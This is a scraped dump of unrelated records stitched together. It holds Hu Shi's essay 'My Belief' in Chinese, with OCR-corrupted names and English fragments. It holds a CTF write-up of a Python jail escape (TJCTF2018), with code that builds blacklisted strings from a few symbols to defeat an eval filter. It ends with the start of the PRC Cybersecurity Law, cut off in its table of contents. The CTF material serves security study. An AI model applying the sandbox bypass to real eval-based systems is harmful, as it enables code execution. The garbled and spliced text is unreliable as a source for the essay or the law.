我的信仰\n我父胡珊，是一位学者，也是一个有坚强意志，有治理才干的人。经过一个时期的文史经籍训练后，他对于地理研究，特别是边省的地理，大起兴趣。他前往京师，怀了一封介绍书，又走了四十二日而达北满吉林，进见钦差大臣吴大激。吴氏是现在见知于欧洲研究中国学问者之中国的一个大考古学家。吴氏延见他，问有什么可以替他为力的。我父说道：“没有什么，只求准我随节去解决中俄界务的纠纷，件我得以研究东北各省的地理。”吴氏对于这个只有秀才底子，在关外长途跋涉之后，差不多已是身无分文的学者，觉得有味。他带了这个少年去干他那历史上有名的差使，得他做了一个最有价值、最肯做事的帮手。\n有一次与我父亲同走的一队人，迷陷在一个广阔的大森林之内，三天找不着出路。到粮食告尽，一切侦察均归失败时，我父亲就提议寻觅溪流。溪流是多半流向森林外面去的，一条溪流找到了手，他们一班人就顺流而行，得达安全的地方。我父亲作了一首长诗纪念这次的事迹，乃四十年后，我在《论杜威教授系统思想说》的一篇论文里，用这件事实以为例证，虽则我未尝提到他的名字，有好些与我父亲相熟而犹生存着的人，都还认得出这件故事，并写信问我是不是他们故世已久的朋友的一个小儿子。\n吴大激对我父亲虽曾一度向政府荐举他为“有治省才能的人”，政治上却并未得臻通显，历官江苏、台湾后，遂于台湾团中日战争的结果而割让与日本时，以五十五岁的寿延逝世。\n我是我父亲的幼儿，也是我母亲的独子。我父亲娶妻凡三次；前妻死于太平天国之乱，乱军掠遍安徽南部各县，将其化为灰烬。次娶生了三个儿子、四个女儿。长子从小便证明是个难望洗心革面的败子。我父亲丧了次妻后，写信回家，说他一定要讨一个纯良强健的、做庄家人家的女儿。\n我外祖父务农，于年终几个月内兼业裁缝。他是出身于一个循善的农家，在太平天国之乱中，全家被杀。因他还只是一个小孩子，故被太平军掠做俘虏，带往军中当差。为要防他逃走，他的脸上就刺了“太平天国”四字，终其身都还留着，但是他吃了种种困苦，居然逃了出来，回到家乡，只寻得一片焦土，无一个家人还得活着。他勤苦工作。耕种田地，兼做裁缝，裁缝的手艺，是他在贼营里学来的。他渐渐长成，娶了一房妻子，生下四个儿女，我母亲就是最长的。\n我外祖父一生的心愿就是想重建被太平军毁了的家传老屋。他每天早上，太阳未出，便到溪头去拣选三大担石子，分三次挑回废屋的地基。挑完之后，他才去种田或去做裁缝。到了晚上回家时，又去三次，挑了三如石子，才吃晚饭。凡此辛苦恒毅的工作，都给我母亲默默看在眼里，他暗恨身为女儿，毫无一点法子能减轻他父亲的辛苦，促他的梦想实现。\n随后来了个媒人，在田里与我外祖父会见，雄辩滔滔的向他替我父亲要他大女儿的庚帖。（按胡先生《我的母亲订婚》一章里面，用的是“八字”二字，英文系 irth date p，故译庚贴似较贴切。）我外祖父答应回去和家里商量。但到他在晚上把所提的话对他的妻子说了，她就大生气。她说：“不行！把我女儿嫁给一个大她三十岁的人，你真想得起？况且他的儿女也有年纪比我们女儿还大的！还有一层，人家自然要说我们嫁女儿给一个老官，是为厂钱财体面而把她牺牲的。”于是这一对老夫妻吵了一场。后来做父亲的说：“我们问问女儿自己。说来说去，这到底是她自己的事。”\n到这个问题对我母亲提了出来，她不肯开口。中国女子遇到同类的情形常是这样的。但她心里却在深思沉想。嫁与中年丧偶、兼有成年儿女的人做填房，送给女家的聘金财扎比一般婚姻却要重得多，这点于她父亲盖房子的计划将大有帮助。况她以前又是见过我父亲的，知道他为全县人所敬重。她爱慕他，愿意嫁他，为的半是英雄崇拜的意识，但大半却是想望帮助劳苦的父亲的孝恩。所以到她给父亲逼着答话，她就坚决的说：“只要你们俩都说他是好人，请你们俩作主。男人家四十七岁也不能算是老。”我外祖父听了，叹了一口气，我外祖母可气的跳起来，忿忿的说：“好呵！你想做官太太了！好罢，听你情愿罢！”\n我母亲于一八八九年结婚，时年十七，我则生在一八九一年十二月。我父殁于一八九五年，留下我母亲二十三岁做了寡妇。我父弃世，我母便做了一个有许多成年儿女的大家庭的家长。中国做后母的地位是十分困难的。她的生活自此时起，自是一个长时间的含辛茹苦。\n我母亲最大的禀赋就是容忍。中国史书记载唐朝有个皇帝垂询张公仪那位家长，问他家以什么道理能九世同居而不分离拆散。那位老人家因过于衰迈，难以口述，请准用笔写出回答。他就写了一百个“忍”字。中国道德家时常举出“百忍”的故事为家庭生活最好的例子，但他们似乎没有一个曾觉察到许多苦恼、倾轧、压迫和不平，使容忍成了一种必不可少的事情。\n那班接脚媳妇凶恶不善的感情，利如锋刃的话语，含有敌意的嘴脸，我母亲事事都耐心容忍。她有时忍到不可再忍，这才早上不起床，柔声大哭，哭她早丧丈夫，她从不开罪她的媳妇，也不提开罪的那件事，但是这些眼泪，每次都有神秘莫测的效果。我总听得有一位嫂嫂的房门开了，和一个妇人的脚步声向厨房走去。不多一会，她转来敲我们房门了。她走进来捧着一碗热茶，送给我的母亲，劝她止哭，母亲接了茶碗，受了她不出声的认错，然后家里又太平清静得个把月。\n我母亲虽则并不知书识字，却把她的全副希望放在我的教育上。我是一个早慧的小孩，不满三岁时，就已认了八百多字，都是我父亲每天用红笺方块教我的。我才满三岁零点，便在学堂里念书。我当时是个多病的小孩，没有搀扶，不能跨一个六英寸高的门槛。但我比学堂里所有别的学生都能读能记些。我从不跟着村中的孩子们一块儿玩。更因我缺少游戏，我五岁时就得了“先生”的绰号。十五年后，我在康奈耳大学做二年级时，也同是为了这个弱点，而被houD比tor 缩读，音与dog同，故用作谐称。译者）的浑名。\n每天天还未亮时，我母亲便把我喊醒，叫我在床上坐起。她然后把对我父亲所知的一切告诉我。她说她望我踏上他的脚步，她一生只晓得他是最善良最伟大的人。据她说，他是一个多么受人敬重的人，以致在他间或休假回家的时期中，附近烟窟赌馆都改行停业。她对我说我惟有行为好，学业科考成功，才能使他们两老增光；又说她所受的种种苦楚，得以由我勤敏读书来酬偿。我往往眼睛半睁半闭的听。但她除遇有女客与我们同住在一个房间的时候外，罕有不施这番晨训的。\n到天大明时，她才把我的衣服穿好，催我去上学。我年稍长，我总是第一个先到学堂，并且差不多每天早晨都是去敲先生的门要钥匙去开学堂的门。钥匙从门缝里递了出来。我隔一会就坐在我的座位上朗朗念书了。学堂里到薄暮才放学，届时每个学生都向朱印石刻的孔夫子大像和先生鞠躬回家。日中上课的时间平均是十二小时。\n我母亲一面不许我有任何种类的儿童游戏，一面对于我建一座孔圣庙的孩子气的企图，却给我种种鼓励。我是从我同父异母的姊姊的长子，大我五岁的一个小孩那里学来的。他拿各种华丽的色纸扎了一座孔庙，使我心里羡慕。我用一个大纸匣子作为正殿，背后开了一个方洞，用一只小匣子糊上去，做了摆孔子牌位的内堂。外殿我供了孔子的各大贤徒，并贴了些小小的匾对，书着颂扬这位大圣人的字句，其中半系录自我外甥的庙里，半系自书中抄来。在这座玩具的庙前，频频有香炷燃着。我母亲对于我这番有孩子气的虔敬也觉得欢喜，暗信孔子的神灵一定有报应，使我成为一个有名的学者，并在科考中成为一个及第的士子。\n我父亲是一个经学家，也是一个严守朱熹（—一三零——一二零零）的新儒教理学的人。他对于释道两教强烈反对。我还记得见我叔父家（那是我的开蒙学堂）的门上有一张日光晒谈了的字条，写着“僧道无缘”几个字。我后来才得知道这是我父亲所遗理学家规例的一部。但是我父亲业已去世，我那彬彬儒雅的叔父，又到皖北去做了一员小吏，而我的几位哥子则都在上海。剩在家里的妇女们，对于我父亲的理学遗规，没有什么拘束了。他们尊守敬奉祖宗的常礼，并随风俗时会所趋，而自由礼神拜佛。观音菩萨是他们所最爱的神，我母亲是为了出于焦虑我的健康福祉的念头，也做了观音的虔诚信士。我记得有一次她到山上观音阁里去进香，她虽缠足，缠足是苦了一生的，在整段的山路上，还是步行来回。\n我在村塾（村中共有七所）里读书。读了九年（一八九五——一九零四）。在这个期间，我读习并记诵了下列几部书： 1.《孝经》：孔子后的一部经籍，作者不明。 2.《小学》：一部论新儒教道德学说的书，普通谓系宋哲朱烹所作。 3.《四书）：《论语》、《孟子》、《大学》、《中庸》。 4.《五经》中的四经：《诗经》、《尚书》、《易经》、《礼记》。\n我母亲对于家用向来是节省的，而付我先生的学金，却坚要比平常要多三倍。平常学金两块银元一年，她首先便送六块钱，后又逐渐增加到十二元。由增加学金这一点小事情，我得到千百倍于上述数目比率所未能给的利益。因为那两元的学生，单单是高声朗读，用心记诵，先生从不劳神去对他讲解所记的字。独我为了有额外学金的缘故，得享受把功课中每字每句解给我听，就是将死板文字译作白话这项难得的权利。\n我年还不满八岁，就能自己念书，由我二哥的提议，先生使我读《资治通鉴》。这部书，实在是大历史家司马光于一零八四年所辑编年式的中国通史。这番读史，使我发生很大的兴趣，我不久就从事把各朝代各帝王各年号编成有韵的歌诀，以资记忆。\n随后有一天，我在叔父家里的废纸箱中，偶然看见一本《水浒传》的残本，便站在箱边把它看完了。我跑遍全村，不久居然得着全部。从此以后，我读尽了本村邻村所知的小说。这些小说都是用白话或口语写的，既易了解、又有引人人胜的趣味。它们教我人生，好的也教，坏的也教，又给了我一件文艺的工具，若干年后，使我能在中国开始民众所称为“文学革命”（iteng Renaissance ，直译当为文艺复兴。译者）的运动。\n其时，我的宗教生活经过一个特异的激变。我系生长在拜偶像的环境，习于诸神凶恶丑怪的面孔，和天堂地狱的民间传说。我十一岁时，一日，温习朱子的《小学》，这部书是我能背诵而不甚了解的。我念到这位理学家引司马光那位史家攻击天堂地狱的通俗信仰的话。这段话说：“形既朽灭，神亦飘散，虽有判烧春磨，亦无所施。”这话好像说得很有道理，我对于死后审判的观念，就开始怀疑起来。\n往后不久，我读司马光的《资治通鉴》，读到第一百三十六卷中有一段，使我成了一个无神论者。所说起的这一段，述纪元五世纪名范缜的一位哲学家，与朝众竞辩“神灭论”。朝廷当时是提倡大乘佛法的。范缜的见解，由司马光摄述为这几句话：“形者神之质地，神者形之用也。神之于形，犹利之于刃。未闻刃没而利存，岂容形灭而神在哉。”\n这比司马光的形灭神散的见解——一种仍认有精神的理论——还更透彻有理。范缜根本否认精神为一种实体，谓其仅系神之用。这一番化繁为简合着我儿童的心胸。读到“朝野喧哗，难之，终不能屈”，更使我心悦。\n同在那一段内，又引据范缜反对因果轮回说的事。他与竞陵工谈论，王对他说：“君不信因果，何得有富贵贫贱？”范缜答道：“人生如树花同发，随风而散；或拂帘幌，坠茵席之上；或关篱墙，落粪涵之中。堕茵席者，殿下是也；落粪涵者，下官是也。贵贱虽复殊途，因果竟在何处？”\n因果之说，由印度传来，在中国人思想生活上已成了主要部分的少数最有力的观念之一。中国古代道德家，常以善有善报，恶有恶报为训。但在现实生活上并不真确。佛教的因果优于中国果报观念的地方，就是可以躲过这个问题，将其归之于前世来世不断的轮回。\n但是范缜的比喻，引起了我幼稚的幻想，使我摆脱了恶梦似的因果绝对论，这是以偶然论来对定命论。而我以十一岁的儿童就取了偶然论而叛离了运命，我在那个儿童时代是没有牵强附会的推理的，仅仅是脾性的迎拒罢了。我是我父亲的儿子，司马光和范缜又得了我的心。仅此而已。\n但是这一种心境的激变，在我早年不无可笑的结果，一九零三年的新年里，我到我住在二十四里外的大姊家去拜年。在她家住了几天，我和她的儿子回家，他是来拜我母亲的年的。他家的一个长工替他挑着新年礼物。我们回到路上，经过一个亭子，供着几个奇形怪状的神像。我停下来对我外甥说：“这里没有人看见，我们来把这几个菩萨抛到污泥坑里去罢。”我这带孩子气的毁坏神像主张，把我的同伴大大地吓住了。他们劝我走路，莫去惹那些本来已经濒于危境的神道。\n这一天正是元宵灯节，我们到了家中，家里有许多客人，我的肚子已经饿了，开饭的时候，我外甥又劝我喝了上杯烧酒。酒在我的肚子里，便作怪起来。我不久便在院子里跑，喊月亮下来看灯。我母亲不悦，叫人来捉我。我在他们前头跑，酒力因我跑路，作用更起得快。我终被捉住，但还努力想挣脱。我母亲抱住我，不久便有许多人朝我们围拢来。\n我心里害怕，便胡言乱道起来。于是我外甥家的长工走到我母亲身边，低低的说：“外婆，我想他定是精神错乱了。恐怕是神道怪了他。今天下午我们路过三门亭，他提议要把几尊菩萨抛到污泥坑里去。一定是这番话弄出来的事。”我窃听了长工的话，忽然想出一条妙计。我喊叫得更凶，好像我就真是三门亭的一个神一样。我母亲于是便当空焚香祷告，说我年幼无知无咎，许下如果蒙神恕我小孩子的罪过，定到亭上去烧香还愿。\n这时候，得报说龙灯来了，在我们屋里的人，都急忙跑去看，只剩下我和母亲两个人。一会儿我就睡着了。母亲许的愿，显然是灵应了。一个月后，我母亲和我上外婆家去，她叫我恭恭敬敬地在三门亭还我们许下的愿。\n我年甫十三，即离家上路七日，以求“新教育”于上海。自这次别离后，我于十四年之中，只省候过我母亲三次，一总同她住了大约七个月。出自她对我伟大的爱忱，她送我出门，分明没有酒过一滴眼泪就让我在这广大的世界中，独自求我自己的教育和发展，所带着的，只是一个母亲的爱，一个读书的习惯，和一点点怀疑的倾向。\n我在上海过了六年（一九零四——一九一零），在美国过了七年（一九一零——一九一七）。在我停留在上海的时期内，我经历过三个学校（无一个是教会学校），一个都没有毕业，我读了当时所谓的“新教育”的基本东西，以历史、地理、英文、数学，和一点零碎的自然科学为主。从故林纤氏及其他请人的意译文字中，我初次认识一大批英国和欧洲的小说家，司各提（SCott ），狄更司（Dickens ），大小仲马（DU.ereet ils）、嚣俄，以及托尔斯泰等氏的都在内。我读了中国上古、中古几位非儒教和新儒教哲学家的著作，并喜欢墨翟的兼爱说与老子、庄子有自然色彩的哲学。\n从当代力量最大的学者梁启超氏的通俗文字中，我渐得略知霍布士、笛卡儿、卢骚、宾坦、康德、达尔文等诸泰西思想家。梁氏是一个崇拜近代西方文明的人，连续发表了些文字，坦然承认中国人以一个民族而言，对于欧洲人所具有许多良好特性，感受缺乏；显著的是注重公共道德，国家思想，爱冒险，私人权利观念与热心防其被侵，爱自由，自治能力，结合的本事与组织的努力，注意身体的培养与健康等。就是这几篇文字猛力把我以我们古旧文明为自足，除战争的武器，商业转运的工具外，没有什么要向西方求学的这种安乐梦中，震醒出来。它们开了给我，也就好像开了给几千几百别的人一样，对于世界整个的新眼界。\n我又读过严复所译穆勒的《自由论》和赫胥黎的《天演论》。严氏所译赫胥黎的论著，于一八九八年就出版，并立即得到知识阶级的接受。有钱的人拿钱出来翻印新版以广流传（当时并没有版权），因为有人以达尔文的言论，尤其是它在社会上与政治上的运用，对于一个感受惰性与儒滞日久的民族，乃是一个合宜的刺激。\n数年之间，许多的进化名词在当时报章杂志的文字上，就成了口头禅。无数的人，都采来做自己的和儿辈的名号，由是提醒他们国家与个人在生存竞争中消灭的祸害。向尝一度闻名的陈炯明以“竞存”为号。我有两个同学名杨天择和孙竞存。\n就是我自己的名字，对于中国以进化论为时尚，也是一个证据。我请我二哥替我起个学名的那天早晨，我还记得清楚。他只想了一刻，他就说，“‘适者生存’中的‘适’字怎么样？”我表同意；先用来做笔名，最后于一九一零年就用作我的名字。\n我对于达尔文与斯宾塞两氏进化假说的一些知识，很容易的与几个中国古代思想家的自然学说连了起来。例如在道家伪书《列子》所述的下面这个故事中，发现二千年前有一个一样年轻，同抱一样信仰的人，使我的童心欢悦：齐田氏祖于庭，食客千人。中坐有献鱼雁者，田氏视之，乃叹日：“天之于民厚矣！殖五谷，生鱼鸟以为之用。”众客和之如响。鲍氏之子，年十二，预于次，进日：“不如君言。天地万物，与我并生，类也。类无贵贱，徒以大小智力而相制，造相食，非相为而生之。人取食者而食之，岂天本为人而生之，且蚊纳哈肤，虎狼食肉，岂天本为蚊的生人，虎狼生肉者钱？”\n一九零六年，我在中国公学同学中，有几位办了一个定期刊物，名《竞业旬报》，——达尔文学说通行的又一例子——其主旨在以新思想灌输于未受教育的民众，系以白话刊行。我被邀在创刊号撰搞。一年之后，我独自做编辑。我编辑这个杂志的工作不但帮助我启发运用现行口语为一种文艺工具的才能，且以明白的话语及合理的次序，想出自我幼年就已具了形式的观念和思想。在我为这个杂志所著的许多论文内，我猛力攻击人民的迷信，且坦然主张毁弃神道，兼持无神论。\n一九零八年，我家因营业失败，经济大感困难。我于十七岁上，就必需供给我自己读书，兼供养家中的母亲。我有一年多停学，教授初等英文，每日授课五小时，月得修金八十元。一九一0 年，我教了几个月的国文。\n那几年（一九零九——一九一零）是中国历史上的黑暗时代，也是我个人历史上的黑暗时代。革命在好几省内爆发，每次都归失败。中国公学原是革命活动的中心，我在那里的旧同学参加此等密谋的实繁有徒，丧失生命的为数也不少。这班政治犯有好些来到上海与我住在一起，我们都是意气消沉，厌世悲观的。我们喝酒，作悲观的诗词，日夜谈论，且往往作没有输赢的赌博。我们甚至还请了一个老伶工来教我们唱戏。有一天早上，我作了一首诗，中有这一句：“霜浓欺日淡”！\n意气消沉与执劳任役驱使我们走人了种种的流浪放荡。有一个雨夜，我喝酒喝得大醉，在镇上与巡捕角斗，把我自己弄进监里去关了一夜。到我次晨回寓，在镜中看出我脸上的血痕，就记起李白饮酒歌中的这一句：“有人用武力，任出吾身物。”。这一句一时也查不出原文。）我决心脱离教书和我的这班朋友。下了一个月的苦工夫，我就前往北京投考用美国退还庚子赔款所设的学额。我考试及格，即于七月间放洋赴美。\n我到美国，满怀悲观。但不久便交结了些朋友，对于那个国家和人民都很喜爱。美国人出自天真的乐观与朝气给了我很好的印象。在这个地方，似乎无一事一物不能由人类智力做得成的。我不能避免这种对于人生持有喜气的眼光的传染，数年之间，就渐渐治疗了我少年老成的态度。\n我第一次去看足球比赛时，我坐在那里以哲学的态度看球赛时的粗暴及狂叫欢呼为乐。而这种狂叫欢呼在我看来，似乎是很不够大学生的尊严的。但是到竞争愈渐激烈，我也就开邮悟这种热心。随后我偶然回头望见白了头发的植物学教授劳理先生诚心诚意的在欢呼狂叫，我觉得如是的自惭，以致我不久也就热心的陪着众人欢呼了。\n就是在民国初年最黑暗的时期内，我还是想法子打起我的精神。在致一个华友的信里面，我说道：“除了你我自己灰心失意，以为无希望外，没有事情是无希望的。”（译意——译者。）在我的日记上，我记下些引录的句子，如引克洛浦的这一句：“如果希望是麻醉物，恐惧就是作伪者。”又如我自己译自勃朗宁的这一节诗：从不转背而挺身向前，从不怀疑云要破裂，虽合理的弄糟，违理的占胜，而从不作迷梦的，相信我们沉而再升，败而再战，睡而再醒。\n一九一四年一月，我写这一句在我的日记上：“我相信我自离开中国后，所学得的最大的事情，就是这种乐观的人生哲学了。”一九一五年，我以关于勃朗宁最优的论文得受柯生奖金。我论文的题目是《勃朗宁乐观主义辩》。我想来大半是我渐次改变了的人生观使我于替他辩护时，以一种诚信的意识来发言。\n我系以在康奈耳大学做纽约农科学院的学生开始我的大学生涯。我的选择是根据了当时中国盛行的，谓中国学生须学点有用的技艺，文学、哲学是没有什么实用的这个信念。但是也有一个经济的动机。农科学院当时不收学费，我心想或许还能够把每月的月费省下一部来汇给我的母亲。\n农场上的经验我一点都不曾有过，并且我的心也不在农业上。一年级的英国文学及德文课程，较之农场实习和养果学，反使我感觉兴趣。踌躇观望了一年又半，我最后转人文理学院，一次缴纳四个学期的学费，就是使我受八个月困境的处分。但是我对于我的新学科觉得更为自然，从不懊悔这番改变。\n有一科《欧洲哲学史》——归故克莱顿教授那位恩师主持，——领导我以哲学做了主科。我对于英国文学与政治学也深有兴趣。康奈耳的哲学院是唯心论的重镇。在其领导之下，我读了古代近代古典派哲学家比较重要的著作，我也读过晚近唯心论者如布拉特莱，鲍森模等的作品，但是他们提出的问题从未引起我的兴趣。\n一九一五年，我往哥林比亚大学，就学于杜威教授，直至一九一七年我回国之时为止。得着杜威的鼓励，我著成我的论文《先秦名学史》这篇论文，使我把中国古代哲学著作重读一遍，并立下我对于中国思想史的一切研究的基础。\n我留美的七年间，我有许多课外的活动，影响我的生命和思想，说不定也与我的大学课业一样。当意气颓唐的时候，我对于基督教大感兴趣，且差不多把《圣经》读完。一九—一年夏，我出席于在宾雪凡尼亚普柯诺派思司举行的中国基督教学生会的大会做来宾时，我几乎打定主意做了基督徒。\n但是我渐渐的与基督教脱离，虽则我对于其发达的历史曾多有习读，因为有好久时光我是一个信仰无抵抗主义的信徒。耶稣降生前五百年，中国哲学家老子曾传授过上善若水，水善应万物而不争。我早年接收老子的这个教训，使我大大的爱着《登山宝训》。","title":"【转】我的信仰——胡适"},{"content":" 通过nc连接problem1.tjctf.org:8004 ,题目提供一个Python交互终端。\n根据题目描述 Reflection 可知与Python反射机制有关。\n所谓反射机制就是能够通过向函数传入字符串参数，来操纵指定对象的类型、属性、方法和类。\nA Python script can find out about the type, class, attributes and methods of an object. This is referred to as reflection or introspection. See also Metaclasses.\nReflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().\n—— https://en.wikibooks.org/wiki/Python_Programming/Reflection\n这里使用dir() 函数查看get_flag 的属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 λ nc problem1.tjctf.org 8004 Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck! \u0026gt;\u0026gt;\u0026gt; get_flag() Traceback (most recent call last): File \u0026#34;\u0026lt;console\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; TypeError: get_flag() takes exactly 1 argument (0 given) \u0026gt;\u0026gt;\u0026gt; get_flag(\u0026#39;1\u0026#39;) 1 is not a valid character \u0026gt;\u0026gt;\u0026gt; get_flag(\u0026#39;@\u0026#39;) Traceback (most recent call last): File \u0026#34;\u0026lt;console\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;/home/app/problem.py\u0026#34;, line 23, in get_flag if(eval(input) == super_secret_string): File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1 @ ^ SyntaxError: unexpected EOF while parsing \u0026gt;\u0026gt;\u0026gt; dir(get_flag) [\u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__globals__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;func_closure\u0026#39;, \u0026#39;func_code\u0026#39;, \u0026#39;func_defaults\u0026#39;, \u0026#39;func_dict\u0026#39;, \u0026#39;func_doc\u0026#39;, \u0026#39;func_globals\u0026#39;, \u0026#39;func_name\u0026#39;] \u0026gt;\u0026gt;\u0026gt; dir(get_flag.func_code) [\u0026#39;__class__\u0026#39;, \u0026#39;__cmp__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;co_argcount\u0026#39;, \u0026#39;co_cellvars\u0026#39;, \u0026#39;co_code\u0026#39;, \u0026#39;co_consts\u0026#39;, \u0026#39;co_filename\u0026#39;, \u0026#39;co_firstlineno\u0026#39;, \u0026#39;co_flags\u0026#39;, \u0026#39;co_freevars\u0026#39;, \u0026#39;co_lnotab\u0026#39;, \u0026#39;co_name\u0026#39;, \u0026#39;co_names\u0026#39;, \u0026#39;co_nlocals\u0026#39;, \u0026#39;co_stacksize\u0026#39;, \u0026#39;co_varnames\u0026#39;] \u0026gt;\u0026gt;\u0026gt; get_flag.func_code.co_consts (None, \u0026#39;this_is_the_super_secret_string\u0026#39;, 48, 57, 65, 90, 97, 122, 44, 95, \u0026#39; is not a valid character\u0026#39;, \u0026#39;%\\xcb\u0026#39;, \u0026#34;You didn\u0026#39;t guess the value of my super_secret_string\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 探索后猜测要求向get_flag() 函数传入一个字符串，eval执行后等于super_secret_string就会返回flag。\n48, 57, 65, 90, 97, 122, 44, 95 应该意味着ASCII值为 48~57，65~90，97~122，44和95的字符不被允许，也就是 [a-zA-Z0-9,_] 被禁用了，测试一下发现确实如此。此外 '%\\xcb' 字符串也是一个提示。\n这题应该是对 A python\u0026rsquo;s escape from PlaidCTF jail 的复现。主要目标是通过有限的字符 集 ({[\u0026lt;'\u0026quot;:~%c\u0026gt;]}) 构造出任意的字符串。主要思路如下：\n[]\u0026lt;{} 逻辑值为True，等价于1；[]\u0026lt;[] 逻辑值为False，等价于0。\n由1和0，结合按位取反~ 和移位 \u0026lt;\u0026lt; 可以得到任意整数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def brainfuckize(nb): if nb in [-2, -1, 0, 1]: return [\u0026#34;~({}\u0026lt;[])\u0026#34;, \u0026#34;~([]\u0026lt;[])\u0026#34;, \u0026#34;([]\u0026lt;[])\u0026#34;, \u0026#34;({}\u0026lt;[])\u0026#34;][nb + 2] if nb % 2: return \u0026#34;~%s\u0026#34; % brainfuckize(~nb) else: return \u0026#34;(%s\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026#34; % brainfuckize(nb / 2) def f(n): # 实际上这个函数就足够了，但生成的结果长度会比第一个长很多。 if n == 0: return \u0026#34;([]\u0026lt;[])\u0026#34; return \u0026#34;~%s\u0026#34; % f(~n) if n % 2 else \u0026#34;(%s\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026#34; % f(n / 2) print f(5), eval(brainfuckize(5)) == 5 # ~(~(~(~([]\u0026lt;[])\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[])) True 字符串 %\\xcb 由% 和 \\xcb) 两个字符构成。repr('%\\xcb') 会得到一个七字符的字符串，其中包含% 和 c 。结合上面的得到的整数就可以构造任意字符了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026gt;\u0026gt;\u0026gt; for i in repr(\u0026#39;%\\xcb\u0026#39;): ... print i, ... \u0026#39; % \\ x c b \u0026#39; \u0026gt;\u0026gt;\u0026gt; for i in `\u0026#39;%\\xcb\u0026#39;`: ... print i, ... \u0026#39; % \\ x c b \u0026#39; \u0026gt;\u0026gt;\u0026gt; `\u0026#39;%\\xcb\u0026#39;`[1::3] \u0026#39;%c\u0026#39; \u0026gt;\u0026gt;\u0026gt; `\u0026#39;%\\xcb\u0026#39;`[1::3]%97 == chr(97) True \u0026gt;\u0026gt;\u0026gt; 在Python2 中 ，反引号包裹是 repr() 的快捷方式，效果完全一致。在Python3中反引号被废除了。\n接下来就可以构造任意字符串并传给get_flag()了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def bf(nb): if nb in [-2, -1, 0, 1]: return [\u0026#34;~({}\u0026lt;[])\u0026#34;, \u0026#34;~([]\u0026lt;[])\u0026#34;, \u0026#34;([]\u0026lt;[])\u0026#34;, \u0026#34;({}\u0026lt;[])\u0026#34;][nb + 2] if nb % 2: return \u0026#34;~%s\u0026#34; % bf(~nb) else: return \u0026#34;(%s\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026#34; % bf(nb / 2) def gen_single_char(c): return \u0026#34;`\u0026#39;%\\\\xcb\u0026#39;`[\u0026#34; + bf(1) + \u0026#34;::\u0026#34; + bf(3) + \u0026#34;]%(\u0026#34; + bf(ord(c)) + \u0026#34;)\u0026#34; secret = \u0026#34;this_is_the_super_secret_string\u0026#34; cmd = \u0026#39;get_flag(\u0026#34;%s\u0026#34;)\u0026#39; % (\u0026#39;+\u0026#39;.join(gen_single_char(i) for i in secret)) print cmd # tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry} ","permalink":"https://ret2neo.cn/post/180814-python-jail-escape/","summary":"通过nc连接problem1.tjctf.org:8004 ,题目提供一个Python交互终端。\n根据题目描述 Reflection 可知与Python反射机制有关。\n所谓反射机制就是能够通过向函数传入字符串参数，来操纵指定对象的类型、属性、方法和类。\nA Python script can find out about the type, class, attributes and methods of an object. This is referred to as reflection or introspection. See also Metaclasses.\nReflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().\n—— https://en.wikibooks.org/wiki/Python_Programming/Reflection\n这里使用dir() 函数查看get_flag 的属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 λ nc problem1.","title":"TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法"},{"content":"中华人民共和国网络安全法 发布时间：2016-11-08 来源：政策法规司\n中华人民共和国主席令\n第五十三号\n《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。\n​ 中华人民共和国主席 习近平\n​ 2016年11月7日\n中华人民共和国网络安全法\n目 录\n​ 第一章 总则\n​ 第二章 网络安全支持与促进\n​ 第三章 网络运行安全\n​ 第一节 一般规定\n​ 第二节 关键信息基础设施的运行安全\n​ 第四章 网络信息安全\n​ 第五章 监测预警与应急处置\n​ 第六章 